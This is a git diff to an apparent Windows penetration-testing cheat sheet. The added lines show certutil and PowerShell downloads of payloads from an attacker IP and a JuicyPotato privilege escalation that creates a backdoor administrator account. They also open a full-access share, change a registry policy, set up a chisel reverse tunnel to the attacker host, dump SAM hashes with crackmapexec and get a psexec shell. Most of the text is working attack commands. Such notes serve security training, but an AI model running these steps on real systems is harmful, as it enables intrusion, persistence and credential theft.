@@ -2,6 +2,8 @@
 
 certutil.exe -> netcat variant for Windows
 
+certutil.exe -f -urlcache -split http://10.10.10.10/chisel.exe C:\Windows\temp
+
 ```bash
 powershell -c iwr -uri http://<attacker_ip>/<file_to_download> -OutFile C:\Windows\Temp\nc.exe
 ```
@@ -13,3 +15,132 @@ powershell -c iwr -uri http://<attacker_ip>/<file_to_download> -OutFile C:\Windo
 The goal of this attack is to generate a Ticket Granted Ticket. For this attack you thenneed to recover the hash of the **krbtgt** user that is the one who 
 can create those tickets
 
+## Check possible priviledge escalation vulnerabilities {-}
+
+1. check os:
+
+    ```bash
+    systeminfo
+    ```
+
+1. copy the result and pase in a file in local
+
+1. download windows-exploit-suggester.py
+
+1. generate xlsx data base
+    
+    ```bash
+    python3 windows-exploit-suggester.py --update
+    ```
+
+1. check systeminfo documentation
+
+    ```
+    python3 windows-exploit-suggester.py -i systeminfo.txt -d 2021-07-14-mssb.xlsx
+    ```
+
+1. github.SecWiki/windows-kernel-exploits
+
+1. python -m http.server
+
+1. certutil.exe -f
+
+## Check command history {-}
+
+```bash
+dir/s *history.txt
+```
+
+## JuicyPotato {-}
+
+Juicy Potato is a local privilege escalation tool that exploit Windows service accounts impersonation privileges.
+
+1. Check user privilege
+
+    ```bash
+    whoami
+    whoami /priv
+    ```
+
+    ```{r, echo = FALSE, fig.cap="impersonate priviledge", out.width="90%"}
+        knitr::include_graphics("images/juicy-impersonate-priv.png")
+    ```
+
+    Here we can see that `SeImpersonatePrivilege` is enabled. That means that we can use JuicyPotatoe to run commands
+
+1. Check users in the system
+
+    ```bash
+    net user
+    ```
+
+1. Create User with Admin privilege
+
+    - download JuicyPotato.exe and copy in the victim machine
+    - create folder in C:\Windows\Temp
+    - Transfer JuicyPotato to Windows Machine
+    
+        ```bash
+        certutil.exe -f -urlcache -split http://10.10.10.10/JuicyPotato.exe JP.exe
+        ```
+    - Create user looping
+
+        ```bash
+        JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user looping looping123! /add"
+        ```
+
+    - Add user to Administrators group
+
+        ```bash
+        JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators looping /add"
+        net user looping
+        ```
+
+    - Create Share folder where user with Administrators rules have Full privilege
+
+        ```bash
+        JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
+        ```
+    
+    - Update local account policy to gain access to the system
+
+        ```bash
+        JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System 
+                                                                    /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+        ```
+
+    - Check with chisel and crackmapexec if user looping is now Pownd 
+
+        - download chisel on attacker machine and on victim machine
+        - run chisel on attacker machine
+
+            ```bash
+            ./chisel server --reverse --port 1234
+            ```
+
+        - run chisel on windows victim machine
+
+            ```bash
+            chisel.exe client 10.10.10.10:1234 R:445:127.0.0.1:445
+            ```
+        - check if revert port forwarding works
+
+            ```bash
+            crackmapexec smb 127.0.0.1
+            ```
+
+        - check if looping is powned
+        
+            ```bash
+            crackmapexec smp -u 'looping' -p 'looping123!' --sam
+
+            #OUTPUT
+            SMB 127.0.0.1   445 MACHINENAME [*] machinename\looping:looping123! (Pwn3d!)
+            ```
+    
+    - Connect to machine with psexec.python
+
+        ```bash
+        locate psexex.py
+        psexec.py WORKGROUP/looping@127.0.0.1 cmd.exe
+        ```
